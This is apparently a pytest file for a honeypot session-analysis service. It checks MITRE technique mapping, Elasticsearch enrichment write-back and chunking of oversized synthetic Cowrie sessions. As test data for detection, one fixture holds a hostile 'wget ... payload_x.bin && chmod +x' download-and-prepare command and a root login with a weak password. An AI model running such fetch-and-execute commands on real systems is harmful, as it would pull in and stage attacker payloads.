import uuid
from datetime import datetime, timedelta, timezone

import pytest
from elasticsearch.helpers import async_bulk
from sqlalchemy import select

from app.config import get_settings
from app.db.models import (
    Analysis,
    EvidenceRef,
    Indicator,
    IndicatorSession,
    ObservedBehavior,
    RecommendedAction,
    SuspiciousIndicator,
    TechniqueMapping,
)
from app.db.session import get_session_factory
from app.es.client import get_es
from app.models.analysis import ANALYSIS_STAGES
from app.seed.seeder import seed
from app.services.analyzer import load_analysis, run_analysis
from app.services.compaction import chunk_session, compact
from app.services.session_builder import get_session_events
from app.workers.queue import analysis_job_key, get_queue

# Cleanup runs INLINE, at the end of each test's own coroutine (try/finally),
# the same pattern tests/test_evidence_barrier.py already uses -- not as a
# separate autouse fixture. A separate fixture's teardown runs as a distinct
# pytest-asyncio finalizer task; under this suite's long, real-model-calling
# tests that showed up as an intermittent asyncpg "attached to a different
# loop" error from SQLAlchemy's pool_pre_ping. Cleaning up from within the
# same task that did the writes avoids that entirely, and still leaves the
# claim tables at zero rows regardless of test order.
#
# Task 15 wired stage 5 (`generating_intel`) into `run_analysis` for real, so
# every call in this file now also writes to `indicators`/`indicator_sessions`
# (`app.services.intel.correlate`) -- a side effect this file predates and
# its own cleanup never accounted for. `_delete_indicators_for_session`
# mirrors the same helper in `tests/test_intel.py`: it removes this
# session's indicator_sessions links, then deletes any indicator left with
# zero remaining links, so a value another still-live session also cites is
# left untouched.


async def _delete_indicators_for_session(session_id: str) -> None:
    factory = get_session_factory()
    async with factory() as db:
        links = (
            (
                await db.execute(
                    select(IndicatorSession).where(IndicatorSession.session_id == session_id)
                )
            )
            .scalars()
            .all()
        )
        indicator_ids = [link.indicator_id for link in links]
        for link in links:
            await db.delete(link)
        await db.flush()

        for indicator_id in indicator_ids:
            remaining = (
                (
                    await db.execute(
                        select(IndicatorSession).where(
                            IndicatorSession.indicator_id == indicator_id
                        )
                    )
                )
                .scalars()
                .first()
            )
            if remaining is None:
                row = await db.get(Indicator, indicator_id)
                if row:
                    await db.delete(row)
        await db.commit()


async def _delete_analysis_and_children(analysis_id: uuid.UUID) -> None:
    factory = get_session_factory()
    async with factory() as db:
        for model in (TechniqueMapping, ObservedBehavior, SuspiciousIndicator):
            rows = (
                (await db.execute(select(model).where(model.analysis_id == analysis_id)))
                .scalars()
                .all()
            )
            for row in rows:
                refs = (
                    (await db.execute(select(EvidenceRef).where(EvidenceRef.parent_id == row.id)))
                    .scalars()
                    .all()
                )
                for ref in refs:
                    await db.delete(ref)
                await db.delete(row)

        actions = (
            (
                await db.execute(
                    select(RecommendedAction).where(RecommendedAction.analysis_id == analysis_id)
                )
            )
            .scalars()
            .all()
        )
        for action in actions:
            await db.delete(action)

        analysis = await db.get(Analysis, analysis_id)
        if analysis:
            await db.delete(analysis)
        await db.commit()


def test_stage_order_matches_the_frontend_union() -> None:
    assert ANALYSIS_STAGES == [
        "parsing_logs",
        "identifying_patterns",
        "classifying_behavior",
        "extracting_indicators",
        "mapping_mitre",
        "generating_intel",
        "generating_recommendations",
    ]


@pytest.mark.asyncio
async def test_analysis_of_the_botnet_session_completes_and_is_grounded() -> None:
    await seed(reset=True)
    analysis_id = await run_analysis("seed-botnet-01")
    try:
        analysis = await load_analysis(analysis_id)

        assert analysis is not None
        assert analysis.status == "completed"
        assert analysis.session_id == "seed-botnet-01"
        assert 0.0 <= analysis.confidence <= 1.0
        assert 0 <= analysis.risk_score <= 100
        assert analysis.techniques, "rules alone should map several techniques"

        for technique in analysis.techniques:
            assert technique.evidence, f"{technique.technique_id} has no evidence"
            for ref in technique.evidence:
                assert ref.event_id
                assert ref.timestamp
                assert ref.session_id == "seed-botnet-01"
    finally:
        await _delete_analysis_and_children(analysis_id)
        await _delete_indicators_for_session("seed-botnet-01")


@pytest.mark.asyncio
async def test_rule_backed_techniques_are_marked_observed() -> None:
    await seed(reset=True)
    analysis_id = await run_analysis("seed-botnet-01")
    try:
        analysis = await load_analysis(analysis_id)

        assert analysis is not None
        ingress = next(t for t in analysis.techniques if t.technique_id == "T1105")
        assert ingress.observed is True
        assert ingress.confidence == 1.0
        assert ingress.ai_explanation is None

        # An LLM gap-fill proposal must never reach the session view marked as
        # observed. GET /api/mitre already draws this line via
        # MitreTechniqueOut.observed; the analysis payload the session page
        # actually renders has to draw exactly the same one, or the two panels
        # on that page disagree about which techniques the telemetry proves.
        for technique in analysis.techniques:
            if technique.ai_explanation is not None:
                assert technique.observed is False, technique.technique_id
    finally:
        await _delete_analysis_and_children(analysis_id)
        await _delete_indicators_for_session("seed-botnet-01")


@pytest.mark.asyncio
async def test_progress_events_cover_every_stage_in_order() -> None:
    await seed(reset=True)
    queue = get_queue()
    received: list[int] = []

    async def collect() -> None:
        async for event in queue.subscribe(analysis_job_key("seed-recon-01")):
            received.append(event.stage_index)

    import asyncio

    task = asyncio.create_task(collect())
    await asyncio.sleep(0.1)
    analysis_id = await run_analysis("seed-recon-01")
    try:
        await asyncio.sleep(0.3)
        task.cancel()

        assert received == sorted(received)
        assert received[0] == 0
        assert max(received) == len(ANALYSIS_STAGES) - 1
    finally:
        await _delete_analysis_and_children(analysis_id)
        await _delete_indicators_for_session("seed-recon-01")


@pytest.mark.asyncio
async def test_analysis_of_a_session_with_no_commands_still_completes() -> None:
    await seed(reset=True)
    analysis_id = await run_analysis("seed-brute-01")
    try:
        analysis = await load_analysis(analysis_id)

        assert analysis is not None
        assert analysis.status == "completed"
        assert analysis.techniques == [] or all(
            t.evidence for t in analysis.techniques
        )
    finally:
        await _delete_analysis_and_children(analysis_id)
        await _delete_indicators_for_session("seed-brute-01")


@pytest.mark.asyncio
async def test_analyzing_an_unknown_session_raises() -> None:
    with pytest.raises(ValueError, match="unknown session"):
        await run_analysis("no-such-session")


# ---------------------------------------------------------------------------
# C-4: Elasticsearch enrichment write-back
#
# Proves the analyzer's post-persist step actually stamps risk.*,
# ai_classification, and mitre.* onto the SESSION'S OWN indexed events --
# not just that write_back_enrichment works in isolation (see
# tests/test_enrichment.py for that), but that run_analysis really calls it
# with the real analysis it just produced.
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_write_back_enrichment_lands_after_a_real_analysis() -> None:
    await seed(reset=True)
    analysis_id = await run_analysis("seed-botnet-01")
    try:
        analysis = await load_analysis(analysis_id)
        assert analysis is not None

        settings = get_settings()
        es = get_es()

        # The wget command is always rule-mapped to T1105 (see
        # test_rule_backed_techniques_are_marked_observed) -- its event must
        # carry the session-wide risk/classification AND the rule-backed
        # mitre.* stamp.
        wget_doc = await es.get(index=settings.es_index, id="seed-botnet-01-008")
        wget_src = wget_doc["_source"]
        assert wget_src["risk"] == {"score": analysis.risk_score, "level": analysis.risk}
        assert wget_src["ai_classification"] == analysis.classification
        assert wget_src["mitre"]["technique_id"] == "T1105"
        assert wget_src["mitre"]["tactic"] == "Command and Control"

        # The connect event is never cited by any technique mapping (it
        # isn't a command at all) but still gets the session-wide
        # risk/classification verdict -- and, having never been cited by a
        # RULE-backed mapping, must never have a mitre.* field at all.
        connect_doc = await es.get(index=settings.es_index, id="seed-botnet-01-000")
        connect_src = connect_doc["_source"]
        assert connect_src["risk"] == {"score": analysis.risk_score, "level": analysis.risk}
        assert connect_src["ai_classification"] == analysis.classification
        assert "mitre" not in connect_src

        # Every technique mapping this analysis actually persisted with
        # source == "rule" must have its event(s) stamped; nothing
        # invented, nothing missed.
        for technique in analysis.techniques:
            if technique.ai_explanation is not None:
                continue  # ai_explanation is None only for rule-backed techniques
            for ref in technique.evidence:
                doc = await es.get(index=settings.es_index, id=ref.event_id)
                mitre = doc["_source"].get("mitre")
                assert mitre is not None, (
                    f"{ref.event_id} should carry a rule-backed mitre stamp"
                )
                assert mitre["technique_id"] == technique.technique_id
    finally:
        await _delete_analysis_and_children(analysis_id)
        await _delete_indicators_for_session("seed-botnet-01")


# ---------------------------------------------------------------------------
# Session-level token budget / chunk-and-merge (carried from Task 10)
#
# num_ctx is 8192. A session with enough commands renders a block well
# past that window. This builds a SYNTHETIC session, indexed directly (not
# part of the fixed seed corpus), large enough that chunk_session actually
# splits it -- proven directly, not just inferred from the pipeline not
# crashing -- and then runs the real pipeline over it end to end.
# ---------------------------------------------------------------------------

_SYNTHETIC_SESSION_ID = "synthetic-oversized-01"
_SYNTHETIC_BASE_TIME = datetime(2026, 8, 25, 9, 0, 0, tzinfo=timezone.utc)
_SYNTHETIC_HONEYPOT = {"id": "cowrie-01", "name": "Cowrie SSH (synthetic)"}


def _synthetic_doc(offset: int, **fields: object) -> dict:
    doc: dict = {
        "@timestamp": (_SYNTHETIC_BASE_TIME + timedelta(seconds=offset))
        .isoformat()
        .replace("+00:00", "Z"),
        "source": {"ip": "203.0.113.77", "port": 40000 + offset},
        "destination": {"port": 2222},
        "network": {"protocol": "ssh"},
        "honeypot": dict(_SYNTHETIC_HONEYPOT),
        "session": {"id": _SYNTHETIC_SESSION_ID},
    }
    doc.update(fields)
    return doc


def _build_oversized_session_docs() -> list[dict]:
    docs = [
        _synthetic_doc(
            0, event={"action": "cowrie.session.connect", "category": "network"}
        ),
        _synthetic_doc(
            1,
            event={
                "action": "cowrie.login.success",
                "category": "authentication",
                "outcome": "success",
            },
            user={"name": "root"},
            credential={"username": "root", "password": "123456"},
        ),
    ]

    # 80 rule-matching filler commands ("ls -la ..." hits T1083, File and
    # Directory Discovery), each padded well past a few hundred characters,
    # so the rendered untrusted block blows past SESSION_TOKEN_BUDGET.
    for i in range(80):
        padding = "a" * 280
        docs.append(
            _synthetic_doc(
                3 + i,
                event={
                    "action": "cowrie.command.input",
                    "category": "process",
                    "outcome": "success",
                },
                process={
                    "command_line": f"ls -la /tmp/scan_index_{i:03d}_{padding}",
                },
            )
        )

    # One real ingress-tool-transfer command, so the analysis still has a
    # genuine, rule-backed, grounded technique to check.
    docs.append(
        _synthetic_doc(
            90,
            event={
                "action": "cowrie.command.input",
                "category": "process",
                "outcome": "success",
            },
            process={
                "command_line": (
                    "wget http://198.51.100.50/payload_x.bin && chmod +x payload_x.bin"
                )
            },
        )
    )

    docs.append(
        _synthetic_doc(95, event={"action": "cowrie.session.closed", "category": "network"})
    )
    return docs


async def _index_oversized_session() -> None:
    settings = get_settings()
    docs = _build_oversized_session_docs()
    actions = [
        {
            "_op_type": "index",
            "_index": settings.es_index,
            "_id": f"{_SYNTHETIC_SESSION_ID}-{i:03d}",
            "_source": doc,
        }
        for i, doc in enumerate(docs)
    ]
    await async_bulk(get_es(), actions, refresh="wait_for")


async def _delete_oversized_session_docs() -> None:
    settings = get_settings()
    await get_es().delete_by_query(
        index=settings.es_index,
        query={"term": {"session.id": _SYNTHETIC_SESSION_ID}},
        refresh=True,
        conflicts="proceed",
    )


@pytest.mark.asyncio
async def test_oversized_synthetic_session_is_actually_chunked() -> None:
    """Proves the chunk-and-merge path is exercised, independent of the
    pipeline outcome: build the same session the end-to-end test below
    analyzes, and show chunk_session really splits it into more than one
    chunk -- not merely that the pipeline happens not to crash.
    """
    await _index_oversized_session()
    try:
        events = await get_session_events(_SYNTHETIC_SESSION_ID)
        compacted = compact(events)
        assert len(compacted.commands) == 81

        chunks = chunk_session(compacted)
        assert len(chunks) > 1, "the synthetic session must exceed a single chunk's budget"

        # Every command survives exactly once across the chunks -- chunking
        # must never drop or duplicate a command.
        seen = [c.event_id for chunk in chunks for c in chunk.commands]
        assert seen == [c.event_id for c in compacted.commands]
    finally:
        await _delete_oversized_session_docs()


@pytest.mark.asyncio
async def test_oversized_synthetic_session_completes_via_chunk_and_merge() -> None:
    """The full pipeline, run for real over a session too large for a
    single context, must still complete and still produce grounded
    claims -- never a confident conclusion quietly built from a prompt
    Ollama truncated on its own.
    """
    await _index_oversized_session()
    analysis_id = None
    try:
        analysis_id = await run_analysis(_SYNTHETIC_SESSION_ID)
        analysis = await load_analysis(analysis_id)

        assert analysis is not None
        assert analysis.status == "completed"

        # The rule-backed technique from the one real malicious command
        # must have survived chunk-and-merge, fully grounded.
        ingress = next(t for t in analysis.techniques if t.technique_id == "T1105")
        assert ingress.confidence == 1.0
        assert ingress.evidence
        for ref in ingress.evidence:
            assert ref.session_id == _SYNTHETIC_SESSION_ID
            assert ref.event_id

        # Every technique this analysis carries -- from any chunk -- has at
        # least one real citation. persist_analysis would have dropped
        # anything ungrounded outright.
        for technique in analysis.techniques:
            assert technique.evidence, f"{technique.technique_id} has no evidence"
    finally:
        if analysis_id is not None:
            await _delete_analysis_and_children(analysis_id)
            await _delete_indicators_for_session(_SYNTHETIC_SESSION_ID)
        await _delete_oversized_session_docs()
